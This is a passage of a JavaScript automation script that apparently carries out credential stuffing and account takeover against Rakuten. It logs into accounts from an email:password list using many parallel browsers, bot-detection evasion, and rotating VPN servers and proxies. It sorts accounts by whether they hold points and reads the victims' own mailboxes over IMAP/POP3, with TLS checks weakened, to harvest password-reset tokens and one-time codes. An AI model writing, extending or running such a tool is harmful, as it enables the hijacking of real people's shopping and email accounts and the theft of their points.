// login_multi_tiled_express_or_proxy.js
// Full runner: each account runs in its own browser process (launch->work->close).
// Requirements: Node.js, Playwright (npm i playwright). Run on Windows.

const fs = require("fs");
const path = require("path");
const readline = require("readline");
const { chromium } = require("playwright");
const { execSync } = require("child_process");
const https = require("https");
const Imap = require("imap");
const POP3Client = require("poplib");
const dns = require("dns").promises;
const { simpleParser } = require("mailparser");
const Database = require('better-sqlite3');
const dbPath = path.resolve(__dirname, 'db.db');
const db = new Database(dbPath, { readonly: true });

// Helper function to make HTTPS requests
function httpsRequest(url, options = {}) {
  return new Promise((resolve, reject) => {
    const urlObj = new URL(url);
    const reqOptions = {
      hostname: urlObj.hostname,
      port: urlObj.port || 443,
      path: urlObj.pathname + urlObj.search,
      method: options.method || "GET",
      headers: options.headers || {},
    };

    const req = https.request(reqOptions, (res) => {
      let data = "";
      res.on("data", (chunk) => {
        data += chunk;
      });
      res.on("end", () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          resolve(data);
        }
      });
    });

    req.on("error", reject);

    if (options.body) {
      req.write(options.body);
    }

    req.end();
  });
}

// ---------------- CONFIG ----------------
const ACCOUNTS_FILE = path.resolve(__dirname, "accounts.txt"); // email:password per line
const PROXY_FILE = path.resolve(__dirname, "proxy.txt"); // optional proxies
const DOMAINS_FILE = path.resolve(__dirname, "domains.txt"); // domain|imap_server

const DEFAULT_CONCURRENCY = 50;
const TIMEOUT_MS = 120000;
const POLL_INTERVAL_MS = 500;
const FAIL_CLOSE_MIN_MS = 1000; // 1000-2000 ms wait before closing on fail
const FAIL_CLOSE_MAX_MS = 2000;
const MIN_WIN_W = 480;
const MIN_WIN_H = 360;

// ExpressVPN
const EXPRESSVPN_CLI =
  process.env.EXPRESSVPN_CLI ||
  "C:\\Program Files (x86)\\ExpressVPN\\services\\ExpressVPN.CLI.exe";
const EXPRESS_JP_SERVERS = [
  "Japan - Osaka",
  "Japan - Shibuya",
  "Japan - Tokyo",
  "Japan - Yokohama",
];
const EXPRESS_ROTATE_EVERY = 1000000000000;
const EXPRESS_CONNECT_WAIT_MS = 7000;

// optional specific Chrome path
const LAUNCH_CHROME_PATH = undefined;

// ---------------- XPATHS & URLs ----------------
const LOGIN_URL =
  "https://login.account.rakuten.com/sso/authorize?client_id=rakuten_ichiba_top_web&service_id=s245&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fwww.rakuten.co.jp%2F#/sign_in";
const CART_XPATH =
  '//a[@href="https://t3.basket.step.rakuten.co.jp/rms/mall/bs/cartall/?l-id=pc_header_func_cart"]';

// ---------------- UTIL ----------------
function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}
function randInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function pickRandom(arr) {
  return arr[randInt(0, arr.length - 1)];
}

function readAccounts() {
  if (!fs.existsSync(ACCOUNTS_FILE)) {
    console.error("Không tìm thấy file accounts.txt:", ACCOUNTS_FILE);
    process.exit(1);
  }
  return fs
    .readFileSync(ACCOUNTS_FILE, "utf8")
    .split(/\r?\n/)
    .map((l) => l.trim())
    .filter(Boolean)
    .map((line) => {
      const [email, password, changePassword] = line
        .split("||")
        .map((s) => s?.trim());
      return { email, password, changePassword };
    })
    .filter((a) => a.email && a.password);
}

function readProxies() {
  if (!fs.existsSync(PROXY_FILE)) return [];
  return fs
    .readFileSync(PROXY_FILE, "utf8")
    .split(/\r?\n/)
    .map((l) => l.trim())
    .filter(Boolean)
    .map(parseProxyLine)
    .filter(Boolean);
}

function readHotmails() {
  const HOTMAIL_FILE = path.resolve(__dirname, "hotmail.txt");
  if (!fs.existsSync(HOTMAIL_FILE)) return [];
  return fs
    .readFileSync(HOTMAIL_FILE, "utf8")
    .split(/\r?\n/)
    .map((l) => l.trim())
    .filter((l) => l && !l.startsWith("#"));
}

// Remove account from accounts.txt after processing
function removeAccountFromFile(email) {
  try {
    const lines = fs.readFileSync(ACCOUNTS_FILE, "utf8").split(/\r?\n/);
    const filtered = lines.filter((line) => {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith("#")) return true;
      const parts = trimmed.split("||");
      return parts[0]?.trim() !== email;
    });
    fs.writeFileSync(ACCOUNTS_FILE, filtered.join("\n"), "utf8");
    console.log(`🗑️  Đã xóa ${email} khỏi accounts.txt`);
  } catch (e) {
    console.warn(`⚠️  Không thể xóa ${email} khỏi accounts.txt:`, e.message);
  }
}

// Remove hotmail from hotmail.txt after successfully changing email
function removeHotmailFromFile(hotmailString) {
  try {
    const HOTMAIL_FILE = path.resolve(__dirname, "hotmail.txt");
    if (!fs.existsSync(HOTMAIL_FILE)) return;

    const lines = fs.readFileSync(HOTMAIL_FILE, "utf8").split(/\r?\n/);
    const filtered = lines.filter((line) => {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith("#")) return true;
      return trimmed !== hotmailString;
    });
    fs.writeFileSync(HOTMAIL_FILE, filtered.join("\n"), "utf8");
    console.log(`🗑️  Đã xóa hotmail khỏi hotmail.txt`);
  } catch (e) {
    console.warn(`⚠️  Không thể xóa hotmail khỏi hotmail.txt:`, e.message);
  }
}
function parseProxyLine(line) {
  let s = line.trim();
  let scheme = "";
  if (/^https?:\/\//i.test(s)) {
    const m = s.match(/^(https?:\/\/)/i);
    scheme = m ? m[1].toLowerCase() : "";
    s = s.replace(/^[a-z]+:\/\//i, "");
  }
  const parts = s.split("@");
  let auth = null,
    hostPart = s;
  if (parts.length === 2) {
    auth = parts[0];
    hostPart = parts[1];
  } else if (parts.length > 2) return null;
  const m = hostPart.match(/^(.+?):(\d{1,5})$/);
  if (!m) return null;
  const host = m[1],
    port = m[2];
  const server = (scheme || "http://") + host + ":" + port;
  let username, password;
  if (auth) {
    const am = auth.match(/^(.+?):(.*)$/);
    if (am) {
      username = decodeURIComponent(am[1]);
      password = decodeURIComponent(am[2]);
    }
  }
  const obj = { server };
  if (username) obj.username = username;
  if (password) obj.password = password;
  return obj;
}

function appendHeaderFiles() {
  const hdr = `Run at ${new Date().toISOString()}\n`;
  // Create point_account.txt, no_point_account.txt and accdie.txt
  fs.writeFileSync(path.resolve(__dirname, "point_account.txt"), hdr, "utf8");
  fs.writeFileSync(
    path.resolve(__dirname, "no_point_account.txt"),
    hdr,
    "utf8",
  );
  fs.writeFileSync(path.resolve(__dirname, "accdie.txt"), hdr, "utf8");
  fs.writeFileSync(path.resolve(__dirname, "email_error.txt"), hdr, "utf8");
}

function execSafe(cmd) {
  try {
    return execSync(cmd, { stdio: "pipe" }).toString();
  } catch (e) {
    const stderr = e && e.stderr ? e.stderr.toString() : e.message;
    throw new Error(stderr || "exec failed");
  }
}
async function connectExpress(server) {
  try {
    execSafe(`"${EXPRESSVPN_CLI}" disconnect`);
  } catch (e) { }
  console.log("Đang kết nối ExpressVPN ->", server);
  execSafe(`"${EXPRESSVPN_CLI}" connect "${server}"`);
  console.log(
    "Đã kết nối ExpressVPN tới",
    server,
    `— đợi ${EXPRESS_CONNECT_WAIT_MS || EXPRESS_CONNECT_WAIT_MS}ms`,
  );
  await sleep(EXPRESS_CONNECT_WAIT_MS);
}

// stealth helpers
function randomUserAgent() {
  const major = randInt(100, 120),
    build = randInt(4200, 5400),
    patch = randInt(10, 200);
  return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${major}.0.${build}.${patch} Safari/537.36`;
}
function stealthInitScript() {
  return `
    (() => {
      try {
        Object.defineProperty(navigator, 'webdriver', { get: () => false, configurable: true });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        Object.defineProperty(navigator, 'plugins', { get: () => [1,2,3,4,5] });
        const orig = navigator.permissions.query;
        navigator.permissions.query = (p) => p && p.name === 'notifications' ? Promise.resolve({ state: Notification.permission }) : orig(p);
      } catch(e) {}
    })();
  `;
}

// detect screen size with temp headful browser
async function detectScreenSize() {
  const tmp = await chromium.launch({
    headless: false,
    args: ["--window-size=800,600"],
  });
  const ctx = await tmp.newContext();
  const page = await ctx.newPage();
  await page.goto("about:blank");
  const dims = await page.evaluate(() => ({
    w: window.screen.availWidth || window.screen.width,
    h: window.screen.availHeight || window.screen.height,
  }));
  await tmp.close();
  return dims;
}

// compute grid (auto) — tile according to concurrency but ensure min sizes; tries to fit into screen
function computeGridForConcurrency(n, screenW, screenH) {
  // choose cols as ceil(sqrt(n)) then rows = ceil(n/cols)
  let cols = Math.ceil(Math.sqrt(n));
  let rows = Math.ceil(n / cols);

  // compute sizes with spacing
  const spacingW = 8,
    spacingH = 60;
  const totalSpacingW = spacingW * (cols - 1);
  const totalSpacingH = spacingH * (rows - 1);
  let winW = Math.floor((screenW - totalSpacingW) / cols);
  let winH = Math.floor((screenH - totalSpacingH) / rows);

  // ensure minimums and fit
  if (winW < MIN_WIN_W) winW = MIN_WIN_W;
  if (winH < MIN_WIN_H) winH = MIN_WIN_H;

  // if computed windows exceed screen, reduce cols/rows if possible
  while (
    (winW * cols + spacingW * (cols - 1) > screenW ||
      winH * rows + spacingH * (rows - 1) > screenH) &&
    cols < n
  ) {
    cols++;
    rows = Math.ceil(n / cols);
    const totalW = spacingW * (cols - 1);
    const totalH = spacingH * (rows - 1);
    winW = Math.floor((screenW - totalW) / cols);
    winH = Math.floor((screenH - totalH) / rows);
    if (winW < MIN_WIN_W) winW = MIN_WIN_W;
    if (winH < MIN_WIN_H) winH = MIN_WIN_H;
    if (cols > n) break;
  }

  return { cols, rows, winW, winH, spacingW, spacingH };
}

// robust login polling: checks for fail_en / fail_ja / success.
// If fail detected, wait random 1000-2000ms before returning 'fail' so caller can close gracefully.
// robust login polling: detect fail (EN/JA/new) or success
async function waitForLoginResult(page, timeoutMs) {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    try {
      // English fail
      const failEn = await page.$(
        '//div[contains(text(),"Username and/or password are incorrect")]',
      );
      if (failEn) {
        await page.waitForTimeout(
          randInt(FAIL_CLOSE_MIN_MS, FAIL_CLOSE_MAX_MS),
        );
        return "fail_en";
      }

      // Japanese fail (new selectors)
      const failJa1 = await page.$(
        '//div[contains(text(),"ユーザIDまたはパスワードが正しくありません")]',
      );
      const failJa2 = await page.$(
        '//div[contains(@class,"error-message") and contains(text(),"ユーザIDまたはパスワード")]',
      );
      const failJa3 = await page.$(
        '//div[@data-testid="error-message" and contains(text(),"ユーザIDまたはパスワード")]',
      );
      if (failJa1 || failJa2 || failJa3) {
        await page.waitForTimeout(
          randInt(FAIL_CLOSE_MIN_MS, FAIL_CLOSE_MAX_MS),
        );
        return "fail_ja";
      }

      // success indicator (cart link visible)
      const success = await page.$(CART_XPATH);
      if (success) return "success";
    } catch (e) {
      // ignore and retry
    }
    await page.waitForTimeout(POLL_INTERVAL_MS);
  }
  return "timeout";
}

// ---------------- IMAP CONFIG ----------------
let imapMappings = {
  "mineo.jp": { server: "imaps.mineo.jp", port: 993 },
  "gmail.com": { server: "imap.gmail.com", port: 993 },
  "google.com": { server: "imap.gmail.com", port: 993 },
  "googlemail.com": { server: "imap.gmail.com", port: 993 },
  "yahoo.com": { server: "imap.mail.yahoo.com", port: 993 },
  "yahoodns.com": { server: "imap.mail.yahoo.com", port: 993 },
  "yahoodns.net": { server: "imap.mail.yahoo.com", port: 993 },
  "outlook.com": { server: "outlook.office365.com", port: 993 },
  "hotmail.com": { server: "outlook.office365.com", port: 993 },
  "office365.com": { server: "outlook.office365.com", port: 993 },
  "office365.cn": { server: "outlook.office365.com", port: 993 },
  "office365.us": { server: "outlook.office365.com", port: 993 },
  "outlook.de": { server: "outlook.office365.com", port: 993 },
  "aol.com": { server: "imap.aol.com", port: 993 },
  "aol-yahoodns.com": { server: "imap.aol.com", port: 993 },
  "aol-yahoodns.net": { server: "imap.aol.com", port: 993 },
  "aol-yahoo.com": { server: "imap.aol.com", port: 993 },
  "icloud.com": { server: "imap.mail.me.com", port: 993 },
  "rakuten.jp": { server: "popmail.gol.com", port: 993 },
  "gol.com": { server: "imap.gol.com", port: 993 },
  "prodigy.net": { server: "imap.mail.att.net", port: 993 },
  "att.net": { server: "imap.mail.att.net", port: 993 },
  "gmx.net": { server: "imap.gmx.com", port: 993 },
  "gmx.com": { server: "imap.gmx.com", port: 993 },
  "schlund.de": { server: "imap.1und1.de", port: 993 },
  "kundenserver.de": { server: "imap.1und1.de", port: 993 },
  "1and1.co.uk": { server: "imap.1and1.co.uk", port: 993 },
  "1and1.fr": { server: "imap.1and1.fr", port: 993 },
  "1and1.es": { server: "imap.1and1.es", port: 993 },
  "1and1.it": { server: "imap.1and1.it", port: 993 },
  "1and1.com": { server: "imap.1and1.com", port: 993 },
  "1and1.mx": { server: "imap.1and1.mx", port: 993 },
  "1and1.at": { server: "imap.1and1.at", port: 993 },
  "1and1.ca": { server: "imap.1and1.ca", port: 993 },
  "1and1.ro": { server: "imap.1and1.ro", port: 993 },
  "ionos.mx": { server: "imap.ionos.mx", port: 993 },
  "ionos.es": { server: "imap.ionos.es", port: 993 },
  "ionos.de": { server: "imap.ionos.de", port: 993 },
  "ionos.com": { server: "imap.ionos.com", port: 993 },
  "yandex.net": { server: "imap.yandex.com", port: 993 },
  "yandex.com": { server: "imap.yandex.com", port: 993 },
  "yandex.ru": { server: "imap.yandex.com", port: 993 },
  "123-reg.co.uk": { server: "imaps.123-reg.co.uk", port: 993 },
  "aruba.it": { server: "imaps.aruba.it", port: 993 },
  "ebox.at": { server: "mail.ebox.at", port: 993 },
  "digitalnova.at": { server: "imap.digitalnova.at", port: 993 },
  "integrity.hu": { server: "imap.integrity.hu", port: 993 },
  "t-online.hu": { server: "mail.t-online.hu", port: 993 },
  "online.be": { server: "mail.online.be", port: 993 },
  "domeneshop.no": { server: "imap.domeneshop.no", port: 993 },
  "uio.no": { server: "imap.uio.no", port: 993 },
  "263.net": { server: "imapw.263.net", port: 993 },
  "qq.com": { server: "imap.qq.com", port: 993 },
  "mxhichina.com": { server: "imap.mxhichina.com", port: 993 },
  "163vip.net": { server: "imap.163vip.net", port: 993 },
  "163.com": { server: "imap.163.com", port: 993 },
  "nicmail.ru": { server: "mail.nicmail.ru", port: 993 },
  "mail.dk": { server: "imap.mail.dk", port: 993 },
  "lolipop.jp": { server: "pop3.lolipop.jp", port: 995 },
  "nifty.jp": { server: "imap.nifty.com", port: 993 },
  "ocn.ad.jp": { server: "pop.ocn.ne.jp", port: 995 },
  "goo.ne.jp": { server: "imap.mail.goo.jp", port: 993 },
  "hi-ho.ne.jp": { server: "imap.hi-ho.ne.jp", port: 993 },
  "biglobe.ne.jp": { server: "mail.biglobe.ne.jp", port: 993 },
  "eonet.ne.jp": { server: "imaps.eonet.ne.jp", port: 993 },
  "securemx.jp": { server: "mail.securemx.jp", port: 993 },
  "goope.jp": { server: "pop.goope.jp", port: 995 },
  "emirates.net.ae": { server: "exmail.emirates.net.ae", port: 993 },
  "freenet.de": { server: "mx.freenet.de", port: 993 },
  "ispgateway.de": { server: "sslmailpool.ispgateway.de", port: 993 },
  "rzone.de": { server: "imap.strato.de", port: 993 },
  "belwue.de": { server: "mbox1.belwue.de", port: 993 },
  "udag.de": { server: "imap.udag.de", port: 993 },
  "t-online.de": { server: "secureimap.t-online.de", port: 993 },
  "web.de": { server: "imap.web.de", port: 993 },
  "datayard.us": { server: "imap.donet.com", port: 993 },
  "ulaval.ca": { server: "courriel.ulaval.ca", port: 993 },
  "kolumbus.fi": { server: "mail.kolumbus.fi", port: 993 },
  "tlen.pl": { server: "poczta.o2.pl", port: 993 },
  "go2.pl": { server: "poczta.o2.pl", port: 993 },
  "onet.pl": { server: "pop3.poczta.onet.pl", port: 995 },
  "iq.pl": { server: "mail.iq.pl", port: 993 },
  "interia.pl": { server: "poczta.interia.pl", port: 993 },
  "wp.pl": { server: "imap.wp.pl", port: 993 },
  "superhost.pl": { server: "mail.superhost.pl", port: 993 },
  "freehost.com.ua": { server: "freemail.freehost.com.ua", port: 993 },
  "serviciodecorreo.es": { server: "imap.serviciodecorreo.es", port: 993 },
  "tele2.se": { server: "imap.tele2.se", port: 993 },
  "ziggo.nl": { server: "imap.ziggo.nl", port: 993 },
  "as9143.net": { server: "imap.ziggo.nl", port: 993 },
  "infomaniak.ch": { server: "mail.infomaniak.ch", port: 993 },
  "netzone.ch": { server: "mail.netzone.ch", port: 993 },
  "sunrise.ch": { server: "imap.sunrise.ch", port: 993 },
  "mailanyone.net": { server: "imap.mailanyone.net", port: 993 },
  "one.com": { server: "imap.one.com", port: 993 },
  "coxmail.com": { server: "imap.coxmail.com", port: 993 },
  "amazon.com": { server: "imap.mail.us-west-2.awsapps.com", port: 993 },
  "staysecuregroup.com": { server: "imap.pop.groth-eu.mx1.staysecuregroup.com", port: 993 },
  "avasin.plus.net": { server: "imap.plus.net", port: 993 },
  "messagingengine.com": { server: "mail.messagingengine.com", port: 993 },
  "gandi.net": { server: "mail.gandi.net", port: 993 },
  "ovh.net": { server: "ssl0.ovh.net", port: 993 },
  "freeola.com": { server: "mail.freeola.com", port: 993 },
  "freeola.net": { server: "mail.freeola.com", port: 993 },
  "secureserver.net": { server: "imap.secureserver.net", port: 993 },
  "secureserver.com": { server: "imap.secureserver.net", port: 993 },
  "dreamhost.com": { server: "imap.dreamhost.com", port: 993 },
  "windstream.net": { server: "imap.windstream.net", port: 993 },
  "carrierzone.com": { server: "securemail25.carrierzone.com", port: 993 },
  "earthlink.net": { server: "imap.earthlink.net", port: 993 },
  "oxsus-vadesecure.net": { server: "imap.earthlink.net", port: 993 },
  "migadu.com": { server: "imap.migadu.com", port: 993 },
  "lcn.com": { server: "imap.lcn.com", port: 993 },
  "zoho.com": { server: "imap.zoho.com", port: 993 },
  "zohomail.com": { server: "imap.zoho.com", port: 993 },
  "zoho.eu": { server: "imap.zoho.com", port: 993 },
  "zohomail.eu": { server: "imap.zoho.com", port: 993 },
  "jimdo.com": { server: "secure.emailsrvr.com", port: 993 },
  "emailsrvr.com": { server: "secure.emailsrvr.com", port: 993 },
  "gosecure.net": { server: "mail.gosecure.net", port: 993 },
  "worksmobile.com": { server: "imap.worksmobile.com", port: 993 },
  "reflexion.net": { server: "imap.reflexion.net", port: 993 },
  "easyname.eu": { server: "imap.easyname.eu", port: 993 },
  "transip.email": { server: "imap.transip.email", port: 993 },
  "online.net": { server: "imap.online.net", port: 993 },
  "integra.net": { server: "imap.integra.net", port: 993 },
  "atlantic.net": { server: "mail.atlantic.net", port: 993 },
  "rr.com": { server: "mail.twc.com", port: 993 },
  "messageexchange.com": { server: "mail.messageexchange.com", port: 993 },
  "draude.net": { server: "mail.draude.net", port: 993 },
  "abchk.net": { server: "imap.abchk.net", port: 993 },
  "level27.eu": { server: "mail.level27.eu", port: 993 },
  "level27.be": { server: "mail.level27.eu", port: 993 },
  "simply.com": { server: "imap.simply.com", port: 993 },
  "netvigator.com": { server: "imap.netvigator.com", port: 993 },
  "privateemail.com": { server: "mail.privateemail.com", port: 993 },
  "everyone.net": { server: "imap.everyone.net", port: 993 },
  "domain.com": { server: "imap.domain.com", port: 993 },
  "wanadoo.com": { server: "imap.orange.fr", port: 993 },
  "daum.net": { server: "imap.daum.net", port: 993 },
  "rr.net": { server: "mail.twc.com", port: 993 },
  "writing.com": { server: "mail.writing.com", port: 993 },
  "hostedemail.com": { server: "imap.hostedemail.com", port: 993 },
  "endrop.com": { server: "mail.endrop.com", port: 993 },
  "hostinger.com": { server: "imap.hostinger.com", port: 993 },
  "hostinger.co": { server: "imap.hostinger.com", port: 993 },
  "hostinger.es": { server: "imap.hostinger.com", port: 993 },
  "hostinger.co.uk": { server: "imap.hostinger.com", port: 993 },
  "centurylink.net": { server: "mail.centurylink.net", port: 993 },
  "megamailservers.com": { server: "securemail.megamailservers.com", port: 993 },
  "megamailservers.eu": { server: "securemail.megamailservers.com", port: 993 },
  "mail.com": { server: "imap.mail.com", port: 993 },
  "mimecast.com": { server: "eu-pop.mimecast.com", port: 995 },
  "muumuu-mail.com": { server: "pop3.muumuu-mail.com", port: 995 },
  "mimecast.co.za": { server: "za-pop.mimecast.co.za", port: 995 },
  "nifcloud.com": { server: "pop.bizmail.nifcloud.com", port: 995 },
  "kcn.ne.jp": { server: "pop1.kcn.jp", port: 993 },
  "dokidoki.ne.jp": { server: "mail.dokidoki.ne.jp", port: 993 },
  "ad-k.jp": { server: "mail.ad-k.jp", port: 993 },
  "m3.kcn.ne.jp": { server: "pop1.kcn.jp", port: 993 },
  "kcn.jp": { server: "pop1.kcn.jp", port: 993 },
};

let domainsLoaded = false;
function loadDomains() {
  if (domainsLoaded) return;
  if (!fs.existsSync(DOMAINS_FILE)) {
    domainsLoaded = true;
    return;
  }
  console.log("📂 Đang tải cấu hình IMAP từ domains.txt...");
  try {
    const lines = fs.readFileSync(DOMAINS_FILE, "utf8").split(/\r?\n/);
    for (const line of lines) {
      if (!line.trim() || line.startsWith("#")) continue;
      const parts = line.split("|");
      if (parts.length >= 2) {
        const domain = parts[0].trim().toLowerCase();
        const server = parts[1].trim();
        const port = parts.length > 2 ? parseInt(parts[2].trim(), 10) : 993;
        if (domain && server) {
          imapMappings[domain] = { server, port: port || 993 };
        }
      }
    }
  } catch (e) {
    console.warn(`⚠️ Lỗi khi đọc domains.txt: ${e.message}`);
  }
  domainsLoaded = true;
  console.log(
    `✅ Đã tải xong danh sách domains (tổng số: ${Object.keys(imapMappings).length})`,
  );
}

async function getAutoconfig(domain) {
  const url = `https://autoconfig.thunderbird.net/v1.1/${domain}`;
  return new Promise((resolve) => {
    https
      .get(url, (res) => {
        if (res.statusCode !== 200) return resolve(null);
        let data = "";
        res.on("data", (d) => (data += d));
        res.on("end", () => resolve(data));
      })
      .on("error", () => resolve(null));
  });
}

async function discoverMailSettings(domain) {
  console.log(`🌐 Đang tự động dò tìm cấu hình cho ${domain}...`);
  // 1. Thử Mozilla Autoconfig
  const xml = await getAutoconfig(domain);
  if (xml) {
    const imapMatch = xml.match(
      /<incoming type="imap">.*?<hostname>(.*?)<\/hostname>.*?<port>(.*?)<\/port>/s,
    );
    if (imapMatch)
      return { server: imapMatch[1], port: parseInt(imapMatch[2], 10) };

    const popMatch = xml.match(
      /<incoming type="pop3">.*?<hostname>(.*?)<\/hostname>.*?<port>(.*?)<\/port>/s,
    );
    if (popMatch)
      return { server: popMatch[1], port: parseInt(popMatch[2], 10) };
  }

  // 2. DNS Brute-force
  const candidates = ["imap", "mail", "pop", "pop3"];
  for (const p of candidates) {
    const host = `${p}.${domain}`;
    try {
      await dns.lookup(host);
      console.log(`✨ Tìm thấy server qua DNS: ${host}`);
      return { server: host, port: p.startsWith("pop") ? 110 : 993 };
    } catch (e) { }
  }

  return null;
}

/**
 * Hàm lấy cấu hình IMAP theo Domain từ SQLite
 */
function getImapConfig(domain) {
  try {
    const query = db.prepare('SELECT * FROM IMAP WHERE Domain = ?');
    const row = query.get(domain);
    if (!row) return null;

    return {
      server: row.Server,
      port: row.Port,
      isSsl: (row.SocketType === 0 || row[3] === 0),
      type: row.Type?.toLowerCase() || 'imap'
    };
  } catch (e) {
    return null;
  }
}

async function getImapServer(domain) {
  const d = domain.toLowerCase();

  // 1. Kiểm tra trong Database trước
  const dbConfig = getImapConfig(d);
  if (dbConfig) {
    return dbConfig;
  }

  // 2. Kiểm tra mapping hiện có (từ domains.txt hoặc hardcode)
  loadDomains();
  const parts = d.split(".");
  for (let i = 0; i <= parts.length - 2; i++) {
    const parentDomain = parts.slice(i).join(".");
    if (imapMappings[parentDomain]) {
      return imapMappings[parentDomain];
    }
  }

  // 3. Nếu không thấy, thử Auto-discovery
  const discovered = await discoverMailSettings(d);
  if (discovered) {
    imapMappings[d] = discovered;
    return discovered;
  }

  // 4. Fallback mặc định
  return { server: `imap.${domain}`, port: 993 };
}

async function readCodeFromEmailPop3(
  email,
  password,
  server,
  port,
  type = "password_reset",
) {
  const isSsl = port == 995 || port == 465;
  const timeout = 30000;
  const startTime = Date.now();
  let lastError = "Timeout - Không tìm thấy mail";
  console.log(`🔍 ${email} - Đang đợi code từ POP3 (${type})...`);

  while (Date.now() - startTime < timeout) {
    try {
      const code = await new Promise((resolve, reject) => {
        const client = new POP3Client(port, server, {
          tlserrs: false,
          enabletls: isSsl,
          debug: false,
        });
        let foundCode = null;

        client.on("error", (err) => reject(err));
        client.on("connect", () => client.login(email, password));
        client.on("login", (status, data) => {
          if (status) client.stat();
          else reject(new Error("POP3 Login failed: INVALID_CREDENTIALS"));
        });

        client.on("stat", (status, data) => {
          if (status && data.count > 0) {
            const total = data.count;
            // Kiểm tra 5 mail mới nhất
            let checked = 0;
            const toCheck = Math.min(5, total);

            const checkNext = (idx) => {
              if (idx <= 0 || checked >= toCheck || foundCode) {
                client.quit();
                resolve(foundCode);
                return;
              }
              client.retr(idx);
            };

            client.on("retr", (status, msgnumber, raw) => {
              simpleParser(raw, (err, parsed) => {
                checked++;
                if (!err && parsed.subject?.includes("Rakuten")) {
                  const text = (parsed.text || "") + (parsed.html || "");
                  let match = null;
                  if (
                    type === "password_reset" &&
                    parsed.subject?.includes("Password Reset")
                  ) {
                    match = text.match(/following code:\s*([a-zA-Z0-9]{20,})/i);
                    if (!match) match = text.match(/token=([a-zA-Z0-9]{20,})/i);
                  } else if (type === "otp") {
                    match = text.match(
                      /verification code is as follows:\s*(\d{6})/i,
                    );
                    if (!match) match = text.match(/\b(\d{6})\b/);
                  }
                  if (match) foundCode = match[1].trim();
                }
                checkNext(total - checked);
              });
            });

            checkNext(total);
          } else {
            client.quit();
            resolve(null);
          }
        });
      });

      if (code) {
        console.log(`✅ ${email} - Đã lấy được code từ POP3: ${code}`);
        return code;
      }
    } catch (e) {
      lastError = e.message || String(e);
      const isAuthError =
        lastError.includes("INVALID_CREDENTIALS") ||
        lastError.includes("AUTHENTICATIONFAILED") ||
        lastError.includes("Login failed");
      const isConfigError =
        lastError.includes("ENOTFOUND") ||
        lastError.includes("ECONNREFUSED") ||
        lastError.includes("ETIMEDOUT");

      if (isAuthError || isConfigError) {
        fs.appendFileSync(
          path.resolve(__dirname, "email_error.txt"),
          `${email}|${password}|CRITICAL_ERROR_POP3: ${lastError}|${new Date().toLocaleString()}\n`,
          "utf8",
        );
        throw new Error(
          `POP3 Error (${isAuthError ? "AUTH" : "IMAP"}): ${lastError}`,
        );
      }
    }
    await sleep(5000);
  }
  fs.appendFileSync(
    path.resolve(__dirname, "email_error.txt"),
    `${email}|${password}|ERROR_POP3: ${lastError}|${new Date().toLocaleString()}\n`,
    "utf8",
  );
  return null;
}

async function readCodeFromEmail(email, password, type = "password_reset") {
  const domain = email.split("@")[1];
  const config = await getImapServer(domain);
  const { server, port } = config;
  const isSsl = config.isSsl || port == 993 || port == 995 || port == 465;
  const isPop3 = config.type === 'pop3' || port == 110 || port == 995;

  if (isPop3) {
    return readCodeFromEmailPop3(email, password, server, port, type);
  }

  const imapConfig = {
    user: email,
    password: password,
    host: server,
    port: port,
    tls: isSsl,
    tlsOptions: {
      rejectUnauthorized: false,
      minVersion: "TLSv1",
      ciphers: "DEFAULT@SECLEVEL=0",
    },
    connTimeout: 20000,
    authTimeout: 20000,
  };

  const timeout = 30000;
  const startTime = Date.now();
  let lastError = "Timeout - Không tìm thấy mail";
  console.log(`🔍 ${email} - Đang đợi code từ email (${type})...`);

  while (Date.now() - startTime < timeout) {
    try {
      const code = await new Promise((resolve, reject) => {
        const imap = new Imap(imapConfig);
        let latestFoundCode = null;
        let highestSeqNo = -1;
        let isDone = false;
        let fetchCount = 0;
        let parsedCount = 0;
        let fetchFinished = false;

        const onDone = (err, result) => {
          if (isDone) return;
          isDone = true;
          imap.removeAllListeners();
          imap.end();
          if (err) reject(err);
          else resolve(result);
        };

        imap.once("ready", () => {
          imap.openBox("INBOX", true, (err, box) => {
            if (err) return onDone(err);
            if (box.messages.total === 0) return onDone(null, null);

            const start = Math.max(1, box.messages.total - 4);
            const fetch = imap.seq.fetch(`${start}:${box.messages.total}`, {
              bodies: "",
            });

            fetch.on("message", (msg, seqno) => {
              fetchCount++;
              msg.on("body", (stream) => {
                simpleParser(stream, (err, parsed) => {
                  parsedCount++;
                  if (!err && parsed.subject?.includes("Rakuten")) {
                    const text = (parsed.text || "") + (parsed.html || "");
                    let match = null;

                    if (
                      type === "password_reset" &&
                      parsed.subject?.includes("Password Reset")
                    ) {
                      match = text.match(
                        /following code:\s*([a-zA-Z0-9]{20,})/i,
                      );
                      if (!match)
                        match = text.match(/token=([a-zA-Z0-9]{20,})/i);
                    } else if (type === "otp") {
                      match = text.match(
                        /verification code is as follows:\s*(\d{6})/i,
                      );
                      if (!match) match = text.match(/\b(\d{6})\b/);
                    }

                    if (match && match[1] && seqno > highestSeqNo) {
                      latestFoundCode = match[1].trim();
                      highestSeqNo = seqno;
                    }
                  }

                  if (fetchFinished && parsedCount === fetchCount) {
                    onDone(null, latestFoundCode);
                  }
                });
              });
            });

            fetch.once("end", () => {
              fetchFinished = true;
              if (parsedCount === fetchCount) {
                onDone(null, latestFoundCode);
              }
            });

            fetch.once("error", (err) => onDone(err));
          });
        });

        imap.once("error", (err) => {
          if (
            err.message &&
            (err.message.includes("AUTHENTICATIONFAILED") ||
              err.message.includes("invalid-user") ||
              err.message.includes("Login failed"))
          ) {
            onDone(new Error("IMAP Login failed: INVALID_CREDENTIALS"));
          } else {
            onDone(err);
          }
        });
        imap.connect();
      });

      if (code) {
        console.log(`✅ ${email} - Đã lấy được code: ${code}`);
        return code;
      }
    } catch (err) {
      lastError = err.message || String(err);
      const isAuthError =
        lastError.includes("INVALID_CREDENTIALS") ||
        lastError.includes("AUTHENTICATIONFAILED") ||
        lastError.includes("Login failed") ||
        lastError.includes("invalid-user");
      const isConfigError =
        lastError.includes("ENOTFOUND") ||
